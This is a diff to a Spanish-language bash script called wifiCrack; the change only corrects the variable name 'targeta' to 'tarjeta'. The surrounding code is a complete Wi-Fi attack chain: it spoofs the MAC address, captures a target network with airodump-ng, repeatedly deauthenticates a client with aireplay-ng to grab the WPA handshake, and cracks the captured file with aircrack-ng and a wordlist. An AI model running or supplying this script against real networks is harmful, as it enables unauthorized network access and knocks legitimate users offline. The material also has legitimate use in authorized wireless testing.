@@ -11,12 +11,12 @@ export DEBIAN_FRONTEND=noninteractive
 function ctrl_c(){
 	echo -e "\n[*] Canselando ataque..."
 	tput cnorm
-	airmon-ng stop ${targeta}mon > /dev/null 2>&1
+	airmon-ng stop ${tarjeta}mon > /dev/null 2>&1
 	exit 0
 }
 
 function ayuda(){
-	echo -e "\n[*] Uso: wifiCrack -t Targeta_de_Red -w Dirección_de_WordList"
+	echo -e "\n[*] Uso: wifiCrack -t Tarjeta_de_Red -w Dirección_de_WordList"
 	echo -e "\n[*] Las capturas se almacenarán en la carpeta que usted se ubique. Si quieres que se almacene en otro lugar, favor de cancelar el proceso con ctrl_c. Se recomienda crear y dirigirse a una carpeta expecífica y estar cerca de WiFi para realizar el ataque sin problemas."
 }
 
@@ -48,14 +48,14 @@ function ataque(){
 	sleep 10
 	clear
 	echo -e "[*] Configurando tarjeta de red...\n"
-	airmon-ng start $targeta > /dev/null 2>&1
-	ifconfig ${targeta}mon down && macchanger -a ${targeta}mon > /dev/null 2>&1
-	ifconfig ${targeta}mon up; killall dhclient wpa_supplicant 2> /dev/null
-	echo -e "[*] Nueva dirección Mac asignada [$(macchanger -s ${targeta}mon | grep -i current | xargs | cut -d ' ' -f '3-100')]"
+	airmon-ng start $tarjeta > /dev/null 2>&1
+	ifconfig ${tarjeta}mon down && macchanger -a ${tarjeta}mon > /dev/null 2>&1
+	ifconfig ${tarjeta}mon up; killall dhclient wpa_supplicant 2> /dev/null
+	echo -e "[*] Nueva dirección Mac asignada [$(macchanger -s ${tarjeta}mon | grep -i current | xargs | cut -d ' ' -f '3-100')]"
 	
 	echo -e "\n[*] Una vez hayas ajustado el tamaño de la ventana de xterm y hayas visto la red que deseas atacar, favor de precionar ctrl+c (o dar un solo clic a cerrar). Luego copie y pegue los datos que se le pide a continuación."
 
-	xterm -hold -e "airodump-ng ${targeta}mon" &
+	xterm -hold -e "airodump-ng ${tarjeta}mon" &
 	airodump_xterm_PID=$!
 
 	tput cnorm
@@ -65,7 +65,7 @@ function ataque(){
 	kill -9 $airodump_xterm_PID
 	wait $airodump_xterm_PID 2>/dev/null
 	
-	xterm -hold -e "airodump-ng --channel $apCanal --bssid $apMac ${targeta}mon" &
+	xterm -hold -e "airodump-ng --channel $apCanal --bssid $apMac ${tarjeta}mon" &
 	airodump2_xterm_PID=$!
 	
 	echo -ne "\n[*] Mac del cliente: " && read apMac2
@@ -74,14 +74,14 @@ function ataque(){
 	wait $airodump2_xterm_PID 2>/dev/null
 
 	tput civis
-	xterm -hold -e "airodump-ng --channel $apCanal -w Captura --bssid $apMac ${targeta}mon" &
+	xterm -hold -e "airodump-ng --channel $apCanal -w Captura --bssid $apMac ${tarjeta}mon" &
 	airodump_filter_xterm_PID=$!
 	sleep 5
 	
 	tput cnorm
 	while :; do
 		#Aquí replay; dudo que se necesite xterm
-		xterm -hold -e "aireplay-ng -0 10 -a $apMac -c $apMac2 ${targeta}mon" &
+		xterm -hold -e "aireplay-ng -0 10 -a $apMac -c $apMac2 ${tarjeta}mon" &
 		aireplay_xterm_PID=$!
 		sleep 15
 		kill -9 $aireplay_xterm_PID
@@ -96,7 +96,7 @@ function ataque(){
 	kill -9 $airodump_filter_xterm_PID
 	wait $airodump_filter_xterm_PID 2>/dev/null
 	
-	airmon-ng stop ${targeta}mon > /dev/null 2>&1
+	airmon-ng stop ${tarjeta}mon > /dev/null 2>&1
 
 	xterm -hold -e "aircrack-ng -w $wordListPath Captura-01.cap" &
 }
@@ -108,7 +108,7 @@ trap ctrl_c INT
 if [ "$(id -u)" == "0" ]; then
         declare -i parametro=0; while getopts ":t:w:h:" arg; do
                 case $arg in
-                        t) targeta=$OPTARG; let parametro+=1 ;;
+                        t) tarjeta=$OPTARG; let parametro+=1 ;;
                         w) wordListPath=$OPTARG; let parametro+=1 ;;
                         h) ayuda;;
                 esac
